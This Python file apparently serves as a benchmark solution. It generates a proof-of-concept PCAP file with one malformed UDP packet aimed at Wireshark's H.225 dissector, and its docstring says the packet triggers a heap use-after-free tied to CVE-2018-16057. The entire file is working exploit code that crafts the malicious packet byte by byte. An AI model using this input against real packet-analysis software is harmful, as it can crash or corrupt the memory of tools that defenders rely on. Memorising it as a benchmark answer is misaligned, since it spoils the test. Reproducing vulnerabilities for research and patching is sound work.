import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        This PoC is based on the one for CVE-2018-16057. It creates a small
        PCAP file with a single malformed UDP packet targeting the H.225
        dissector. The crafted H.225 payload causes a heap use-after-free
        vulnerability.

        The structure of the PoC file is:
        1. PCAP Global Header (24 bytes)
        2. PCAP Record Header (16 bytes)
        3. Raw IP Packet (33 bytes) containing:
           a. IP Header (20 bytes)
           b. UDP Header (8 bytes)
           c. H.225 Payload (5 bytes)
        
        Total length is 73 bytes, matching the ground-truth length.
        """
        
        # PCAP Global Header (little-endian)
        # magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
        pcap_global_header = struct.pack(
            "<IHHIIII",
            0xa1b2c3d4,  # Magic number for little-endian
            2,           # Version major
            4,           # Version minor
            0,           # Timezone offset
            0,           # Accuracy of timestamps
            65535,       # Max length of captured packets
            113          # Data link type (LINKTYPE_RAW)
        )

        # The malicious H.225 payload
        h225_payload = b'\x08\x00\x00\x00\x00'

        # UDP Header (big-endian/network byte order)
        # src_port, dst_port, length, checksum
        udp_header = struct.pack(
            ">HHHH",
            1719,                       # Source Port (H.225 RAS)
            1719,                       # Destination Port (H.225 RAS)
            8 + len(h225_payload),      # Length (UDP header + payload)
            0                           # Checksum (optional in IPv4)
        )

        # IP Header (big-endian/network byte order)
        # ver_ihl, tos, tot_len, id, frag_off, ttl, proto, check, saddr, daddr
        # Checksum is pre-calculated from a known working PoC.
        ip_header = struct.pack(
            '!BBHHHBBHII',
            (4 << 4) | 5,               # Version (4) and IHL (5)
            0,                          # Differentiated Services Field
            20 + len(udp_header) + len(h225_payload), # Total Length
            1,                          # Identification
            0x4000,                     # Flags (Don't Fragment)
            64,                         # Time to Live
            17,                         # Protocol (UDP)
            0xb8e7,                     # Header Checksum (pre-calculated)
            0x7f000001,                 # Source IP (127.0.0.1)
            0x7f000001                  # Destination IP (127.0.0.1)
        )

        packet_data = ip_header + udp_header + h225_payload

        # PCAP Record Header (little-endian)
        # ts_sec, ts_usec, incl_len, orig_len
        pcap_record_header = struct.pack(
            "<IIII",
            0,                          # Timestamp seconds
            0,                          # Timestamp microseconds
            len(packet_data),           # Number of octets saved in file
            len(packet_data)            # Actual length of packet
        )

        return pcap_global_header + pcap_record_header + packet_data